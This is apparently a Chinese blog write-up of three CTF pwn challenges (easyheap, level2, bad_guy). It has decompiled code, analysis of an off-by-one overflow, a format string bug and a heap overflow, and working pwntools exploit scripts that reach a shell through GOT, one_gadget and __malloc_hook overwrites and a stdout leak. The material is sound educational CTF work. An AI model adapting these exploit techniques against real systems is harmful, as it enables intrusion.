<h4 id="delete函数如下："><a href="#delete函数如下：" class="headerlink" title="delete函数如下："></a>delete函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+0h] [bp-10h]@1</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+4h] [bp-Ch]@1</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4uLL);</span><br><span class="line">  v1 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( heaparray[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)heaparray[v1] + 1));</span><br><span class="line">    free(heaparray[v1]);</span><br><span class="line">    heaparray[v1] &#x3D; 0LL;</span><br><span class="line">    puts(&quot;Done !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;How Dare you!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在edit()函数发现off_by_one，我们可以利用它来修改某个chunk的size位，来造成堆块的重叠，从而可以修改&amp;content的地址，实现任意地址的读写。</p>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python </span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27902)</span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;easyheap&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;easyheap&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">free_got&#x3D;elf.got[&#39;free&#39;]</span><br><span class="line"></span><br><span class="line">def add(size,content) :</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(1))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def edit(index,content) :</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(2))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def show(index) :</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(3))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">def delete(index) :</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(4))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">add(0x18,&#39;aaaaa&#39;) #0</span><br><span class="line">delete(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0x38,&#39;bbbbbb&#39;) #0</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0x18,&#39;cccccc&#39;) #1</span><br><span class="line">payload&#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">add(0x18,&#39;ddddddd&#39;) #2</span><br><span class="line">add(0x18,payload)#3</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">payload2&#x3D;&#39;a&#39;*0x30+p64(0)+&#39;\x41&#39;</span><br><span class="line">edit(0,payload2)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">payload3&#x3D;&#39;a&#39;*0x10+p64(0)+p64(0x21)+p64(0x18)+p64(free_got)</span><br><span class="line">add(0x38,payload3)</span><br><span class="line"></span><br><span class="line">show(2)</span><br><span class="line">sh.recvuntil(&#39;Content : &#39;)</span><br><span class="line">free_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;free_addr:&#39; +hex(free_addr))</span><br><span class="line">libc&#x3D;LibcSearcher(&#39;free&#39;,free_addr)</span><br><span class="line">libc_base&#x3D;free_addr-libc.dump(&#39;free&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">print(&#39;system_addr:&#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">payload4&#x3D;p64(system_addr)</span><br><span class="line">edit(2,payload4)</span><br><span class="line">delete(3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><h4 id="checksec检查-1"><a href="#checksec检查-1" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-1"><a href="#main函数如下：-1" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, buf, 0x64uLL);</span><br><span class="line">    if ( !strcmp(buf, &quot;66666666&quot;) )</span><br><span class="line">      break;</span><br><span class="line">    printf(buf, &quot;66666666&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个程序只有一个可以循环利用的格式化字符串漏洞，一般来说，如果我们输入的格式化字符串在栈上，那么我们可以通过向格式化字符串所在位置这样一个偏移处写入任意值，从而实现任意地址写。但是这道题buf不在栈上，而是在bss段上（有时在堆上也是基本一样的利用），实现任意写需要依赖一个链表结构。</p>
<h4 id="栈数据"><a href="#栈数据" class="headerlink" title="栈数据"></a>栈数据</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ stack 31</span><br><span class="line">0000| 0x7fffffffde78 --&gt; 0x555555554824 (&lt;main+138&gt;:	jmp    0x5555555547da &lt;main+64&gt;)</span><br><span class="line">0008| 0x7fffffffde80 --&gt; 0x555555554830 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">0016| 0x7fffffffde88 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">0024| 0x7fffffffde90 --&gt; 0x1 </span><br><span class="line">0032| 0x7fffffffde98 --&gt; 0x7fffffffdf68 --&gt; 0x7fffffffe2d3 (&quot;&#x2F;home&#x2F;pwn&#x2F;pwn&#x2F;npuctf&#x2F;level2&#x2F;level2&quot;)</span><br><span class="line">0040| 0x7fffffffdea0 --&gt; 0x1f7ffcca0 </span><br><span class="line">0048| 0x7fffffffdea8 --&gt; 0x55555555479a (&lt;main&gt;:	push   rbp)</span><br><span class="line">0056| 0x7fffffffdeb0 --&gt; 0x0 </span><br><span class="line">0064| 0x7fffffffdeb8 --&gt; 0x87b68dfcf204a6c4 </span><br><span class="line">0072| 0x7fffffffdec0 --&gt; 0x555555554690 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">0080| 0x7fffffffdec8 --&gt; 0x7fffffffdf60 --&gt; 0x1 </span><br><span class="line">0088| 0x7fffffffded0 --&gt; 0x0 </span><br><span class="line">0096| 0x7fffffffded8 --&gt; 0x0 </span><br><span class="line">0104| 0x7fffffffdee0 --&gt; 0xd2e3d8a9df44a6c4 </span><br><span class="line">0112| 0x7fffffffdee8 --&gt; 0xd2e3c813cdb4a6c4 </span><br><span class="line">0120| 0x7fffffffdef0 --&gt; 0x0 </span><br><span class="line">0128| 0x7fffffffdef8 --&gt; 0x0 </span><br><span class="line">0136| 0x7fffffffdf00 --&gt; 0x0 </span><br><span class="line">0144| 0x7fffffffdf08 --&gt; 0x7fffffffdf78 --&gt; 0x7fffffffe2f6 (&quot;XDG_VTNR&#x3D;7&quot;)</span><br><span class="line">0152| 0x7fffffffdf10 --&gt; 0x7ffff7ffe168 --&gt; 0x555555554000 --&gt; 0x10102464c457f </span><br><span class="line">0160| 0x7fffffffdf18 --&gt; 0x7ffff7de77db (&lt;_dl_init+139&gt;:	jmp    0x7ffff7de77b0 &lt;_dl_init+96&gt;)</span><br><span class="line">0168| 0x7fffffffdf20 --&gt; 0x0 </span><br><span class="line">0176| 0x7fffffffdf28 --&gt; 0x0 </span><br><span class="line">0184| 0x7fffffffdf30 --&gt; 0x555555554690 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">0192| 0x7fffffffdf38 --&gt; 0x7fffffffdf60 --&gt; 0x1 </span><br><span class="line">--More--(25&#x2F;31)</span><br><span class="line">0200| 0x7fffffffdf40 --&gt; 0x0 </span><br><span class="line">0208| 0x7fffffffdf48 --&gt; 0x5555555546ba (&lt;_start+42&gt;:	hlt)</span><br><span class="line">0216| 0x7fffffffdf50 --&gt; 0x7fffffffdf58 --&gt; 0x1c </span><br><span class="line">0224| 0x7fffffffdf58 --&gt; 0x1c </span><br><span class="line">0232| 0x7fffffffdf60 --&gt; 0x1 </span><br><span class="line">0240| 0x7fffffffdf68 --&gt; 0x7fffffffe2d3 (&quot;&#x2F;home&#x2F;pwn&#x2F;pwn&#x2F;npuctf&#x2F;level2&#x2F;level2&quot;)</span><br></pre></td></tr></table></figure>

<p>我们可以来看一下栈上面的数据，发现偏移为1的地方是libc，我们可以通过格式化字符串来泄露，得到one_gadget的实际地址，我们还需要知道ret_addr，我们需要将ret_addr写到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0032| 0x7fffffffde98 --&gt; 0x7fffffffdf68 --&gt; 0x7fffffffe2d3 (&quot;&#x2F;home&#x2F;pwn&#x2F;pwn&#x2F;npuctf&#x2F;level2&#x2F;level2&quot;)</span><br></pre></td></tr></table></figure>

<p>这个地方，这里是一个二级指针，指向</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0240| 0x7fffffffdf68 --&gt; 0x7fffffffe2d3 (&quot;&#x2F;home&#x2F;pwn&#x2F;pwn&#x2F;npuctf&#x2F;level2&#x2F;level2&quot;)</span><br></pre></td></tr></table></figure>

<p>这个地方，我们在第一个地方写入ret_addr地址，然后在第二地方写入one_gadget地址，这样在程序执行完返回的时候，就可以getshell了。我们需要知道ret_addr，虽然栈的地址是随机的，但是我们知道栈上面的数据之间的偏移是不变的，这里我选取的是<code>0x7fffffffdf68</code>这个地址，栈底指针和栈顶指针相同，那么主函数的返回地址就是rbp的下一个地址，这里就是<code>0x7fffffffde80</code>，所以<code>0x7fffffffdf68-0x7fffffffde80=0xe8</code>，只要我们泄露出<code>0x7fffffffdf68</code>这个地址，我们就可以知道ret_addr的地址了。</p>
<h4 id="exp如下：-1"><a href="#exp如下：-1" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27316)</span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;level2&#39;)</span><br><span class="line">#elf&#x3D;ELF(&#39;.&#x2F;level2&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc6_2.23-0ubuntu10_amd64.so&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def Write2Byte(data,offset):</span><br><span class="line">    global ret_addr</span><br><span class="line">    _offset &#x3D; (ret_addr + offset) % 0x10000</span><br><span class="line">    if(data &#x3D;&#x3D; 0):</span><br><span class="line">      payload&#x3D;&quot;%.&quot; + str(_offset) + &quot;d%9$hn&quot;</span><br><span class="line">      payload&#x3D;payload.ljust(0x64,&#39;\x00&#39;)</span><br><span class="line">      sh.send(payload)</span><br><span class="line">      sh.recv()</span><br><span class="line">      payload&#x3D;&quot;%35$hn&quot;</span><br><span class="line">      payload&#x3D;payload.ljust(0x64,&#39;\x00&#39;)</span><br><span class="line">      sh.send(payload)</span><br><span class="line">      sh.recv()</span><br><span class="line">    else:</span><br><span class="line">      payload&#x3D;&quot;%.&quot; + str(_offset) + &quot;d%9$hn&quot;</span><br><span class="line">      payload&#x3D;payload.ljust(0x64,&#39;\x00&#39;)</span><br><span class="line">      sh.send(payload)</span><br><span class="line">      sh.recv()</span><br><span class="line">      payload&#x3D;&quot;%.&quot; + str(data) + &quot;d%35$hn&quot;</span><br><span class="line">      payload&#x3D;payload.ljust(0x64,&#39;\x00&#39;)</span><br><span class="line">      sh.send(payload)</span><br><span class="line">      sh.recv()</span><br><span class="line">def Write8Byte(data,offset):</span><br><span class="line">  _offset &#x3D; offset</span><br><span class="line">  Write2Byte(int(data[10:14],16),_offset)</span><br><span class="line">  Write2Byte(int(data[6:10],16),_offset+2)</span><br><span class="line">  Write2Byte(int(data[2:6],16),_offset+4)</span><br><span class="line">  Write2Byte(0,_offset+6)</span><br><span class="line">  return _offset + 8</span><br><span class="line"></span><br><span class="line">payload1&#x3D;&#39;%7$p&#39;</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">libc_main_addr&#x3D;int(sh.recv(14),16)-240</span><br><span class="line">print (&#39;libc_main_addr:&#39; +hex(libc_main_addr))</span><br><span class="line"></span><br><span class="line">#libc&#x3D;LibcSearcher(&#39;__libc_start_main&#39;,libc_main_addr)</span><br><span class="line">#libc_base&#x3D;libc_main_addr-libc.dump(&#39;__libc_start_main&#39;)</span><br><span class="line">#0x45216</span><br><span class="line">#0x4526a</span><br><span class="line">#0xf02a4</span><br><span class="line">#0xf1147</span><br><span class="line">libc_base&#x3D;libc_main_addr-libc.sym[&#39;__libc_start_main&#39;]</span><br><span class="line"></span><br><span class="line">one_gadget&#x3D;libc_base+0xf1147</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;+%9$p&#39;</span><br><span class="line">sh.send(payload2)</span><br><span class="line">offest&#x3D;0xe0</span><br><span class="line">sh.recvuntil(&#39;+&#39;)</span><br><span class="line">data&#x3D;int(sh.recv(14),16)</span><br><span class="line">ret_addr&#x3D;data-offest</span><br><span class="line">print (&#39;ret_addr:&#39; +hex(ret_addr))</span><br><span class="line"></span><br><span class="line">offset&#x3D;0</span><br><span class="line">offset&#x3D;Write8Byte(str(hex(one_gadget)),offset)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">payload&#x3D;&#39;66666666\x00&#39;</span><br><span class="line">sh.send(payload)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="bad-guy"><a href="#bad-guy" class="headerlink" title="bad_guy"></a>bad_guy</h3><h4 id="checksec检查-2"><a href="#checksec检查-2" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-2"><a href="#main函数如下：-2" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; eax@2</span><br><span class="line">  const char **v4; &#x2F;&#x2F; [sp+0h] [bp-20h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; argv;</span><br><span class="line">  prog_init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;&#x3D;&#x3D;&#x3D; Bad Guy &#x3D;&#x3D;&#x3D;&quot;);</span><br><span class="line">      puts(&quot;1. Malloc&quot;);</span><br><span class="line">      puts(&quot;2. Edit&quot;);</span><br><span class="line">      puts(&quot;3. Free&quot;);</span><br><span class="line">      printf(&quot;&gt;&gt; &quot;, v4);</span><br><span class="line">      v3 &#x3D; read_num();</span><br><span class="line">      if ( v3 !&#x3D; 2 )</span><br><span class="line">        break;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 &#x3D;&#x3D; 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        delete();</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v3 &#x3D;&#x3D; 4 )</span><br><span class="line">          exit(0);</span><br><span class="line">LABEL_13:</span><br><span class="line">        puts(&quot;2333, Bad Guy!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 !&#x3D; 1 )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下："><a href="#add函数如下：" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssize_t add()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; &#x2F;&#x2F; rax@1</span><br><span class="line">  size_t v1; &#x2F;&#x2F; rax@1</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [sp+0h] [bp-10h]@1</span><br><span class="line">  void *size; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  LODWORD(v0) &#x3D; read_num();</span><br><span class="line">  printf(&quot;size: &quot;, v0);</span><br><span class="line">  LODWORD(v1) &#x3D; read_num();</span><br><span class="line">  size &#x3D; (void *)v1;</span><br><span class="line">  heaparray[2 * v3 + 1] &#x3D; malloc(v1);</span><br><span class="line">  if ( !heaparray[2 * v3 + 1] || v3 &gt; 0xA )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Bad Guy!&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  heaparray[2 * v3] &#x3D; size;</span><br><span class="line">  printf(&quot;Content:&quot;);</span><br><span class="line">  return read(0, heaparray[2 * v3 + 1], (size_t)size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit函数如下：-1"><a href="#edit函数如下：-1" class="headerlink" title="edit函数如下："></a>edit函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int edit()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; &#x2F;&#x2F; rax@4</span><br><span class="line">  size_t v1; &#x2F;&#x2F; rax@4</span><br><span class="line">  int result; &#x2F;&#x2F; eax@6</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [sp+0h] [bp-10h]@4</span><br><span class="line">  size_t nbytes; &#x2F;&#x2F; [sp+8h] [bp-8h]@4</span><br><span class="line"></span><br><span class="line">  if ( count &lt;&#x3D; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Bad Guy!&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  --count;</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  LODWORD(v0) &#x3D; read_num();</span><br><span class="line">  printf(&quot;size: &quot;, v0);</span><br><span class="line">  LODWORD(v1) &#x3D; read_num();</span><br><span class="line">  nbytes &#x3D; v1;</span><br><span class="line">  if ( heaparray[2 * v3 + 1] &amp;&amp; v3 &lt;&#x3D; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;content: &quot;);</span><br><span class="line">    result &#x3D; read(0, heaparray[2 * v3 + 1], nbytes);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; puts(&quot;Bad Guy!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="delete函数如下：-1"><a href="#delete函数如下：-1" class="headerlink" title="delete函数如下："></a>delete函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v0; &#x2F;&#x2F; rax@1</span><br><span class="line">  void **v1; &#x2F;&#x2F; rax@3</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  LODWORD(v0) &#x3D; read_num();</span><br><span class="line">  v3 &#x3D; v0;</span><br><span class="line">  if ( heaparray[2 * v0 + 1] || v0 &gt; 0xA )</span><br><span class="line">  &#123;</span><br><span class="line">    free(heaparray[2 * v0 + 1]);</span><br><span class="line">    v1 &#x3D; &amp;heaparray[2 * v3 + 1];</span><br><span class="line">    *v1 &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) &#x3D; puts(&quot;Bad Guy!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return (unsigned __int64)v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序没有类似show的函数，也没有uaf漏洞，但是有一个非常友好的堆溢出漏洞，可以造成任意字节长度的溢出，而且程序可以申请任意大小的chunk。这就满足了house of roman的利用条件，关于house of roman原理可以看我博客其他的文章。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li>创建4个chunk，大小分别是<code>chunk0:0x10</code>,<code>chun1:0x50</code>,<code>chunk2:0x60</code>,<code>chunk3:0x60</code>,free掉chunk2,修改chunk1的size位为0xd1，然后free掉chunk1，然后再申请0x50大小的chunk，此时被free掉的chunk2和chunk1的fd和bk指针都指向<code>main_arean</code>这个地址，这也是为什么要申请0xd1的原因，至于这里为什么会这样，是因为unsorted bin中的chunk被切割的缘故。</li>
<li>然后我们再修改chunk2 fd指针的低2个字节为<code>malloc_hook-0x23</code>连续malloc俩次拿到<code>malloc_hook-0x23</code>这个fake_chunk</li>
<li>再次修改chunk2的size为0xf1，fd指针的低2个字节为<code>malloc_hook-0x10</code>，malloc拿到这个chunk，此时，malloc_hook中为<code>main_arean</code>的地址，具体原因是因为unsorted bin attack ，可以看我其他博客。</li>
<li>通过我们之前申请的fake_chunk<code>malloc_hook-0x23</code>，将malloc_hook的地址修改为one_gadget地址。</li>
<li>最后我们随便malloc一个chunk来getshell。</li>
</ol>
<h4 id="exp如下：-2"><a href="#exp如下：-2" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;bad_guy&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;bad_guy&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(index,size,content) :</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def edit(index,size,content) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base&#x3D;0xa0d000</span><br><span class="line"></span><br><span class="line">add(0,0x10,&#39;L0ne1y&#39;)</span><br><span class="line">add(1,0x50,&#39;L0ne1y&#39;)</span><br><span class="line">add(2,0x60,&#39;L0ne1y&#39;)</span><br><span class="line">add(3,0x60,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">off_by_one&#x3D;&#39;a&#39;*0x10+p64(0)+p64(0xd1)</span><br><span class="line">edit(0,0x20,off_by_one)</span><br><span class="line">free(1)</span><br><span class="line">add(1,0x50,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">malloc_hook_here&#x3D;&#39;a&#39;*0x40+p64(0)*3+p64(0x71)+p64(libc_base+libc.sym[&#39;__malloc_hook&#39;]-0x23)[:2]</span><br><span class="line">edit(1,0x62,malloc_hook_here)</span><br><span class="line"></span><br><span class="line">#get malloc_hook-0x23</span><br><span class="line">add(2,0x60,p64(0))</span><br><span class="line">add(4,0x60,p64(0))</span><br><span class="line"></span><br><span class="line">edit(1,0x62+8,&#39;a&#39;*0x40+p64(0)*3+p64(0xf1)+p64(0)+p64(libc_base+libc.sym[&#39;__malloc_hook&#39;]-0x10)[:2])</span><br><span class="line"></span><br><span class="line">add(5,0xe0,&#39;L0ne1y&#39;) # unsorted bins</span><br><span class="line">#one_gadget &#x3D; [0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">one_gadget &#x3D; libc_base + 0xf1147</span><br><span class="line">edit(4,0x16,&#39;a&#39;*0x13+p64(one_gadget)[:3])</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(str(6))</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(str(0x10))</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="爆破脚本"><a href="#爆破脚本" class="headerlink" title="爆破脚本"></a>爆破脚本</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">for i in &#96;seq 1 5000&#96;; do python exp.py; done;</span><br></pre></td></tr></table></figure>

<p>通过爆破12bit的方式来进行getshell，爆破概率为1/4096，用这个脚本来打远程，难度太大了。我们结合io流的知识来进行泄露libc，来getshell。关于io流的知识可以看我其他博客。</p>
<h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li>还是和刚才一样创建4个chunk，free掉chunk2，修改chunk1的size位为0x的d1，free掉chunk1，然后再申请chunk，使chunk2同时在fastbin和unsorted bin中。</li>
<li>然后通过chunk1修改chunk2的fd位低2个字节为<code>0x25dd</code>使地址变为<code>_IO_2_1_stderr_+157</code>，这里5dd是固定的，2是随机的，这个地址可以绕过size检查。</li>
<li>连续2次malloc拿到这个地址，然后修改stdout的flag位为<code>0xfbad1800</code>,并且将<code>_IO_write_base</code>的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。</li>
<li>free掉chunk2，通过chunk1修改chunk2的fd位低2个字节为<code>malloc_hook-0x23</code></li>
<li>连续2次malloc拿到这个地址，将one_gadget写入<code>malloc_hook</code></li>
<li>随便malloc一次getshell。</li>
</ol>
<p>这种利用方法我们有1/16的机会可以getshell，比House of Roman的机会大很多。</p>
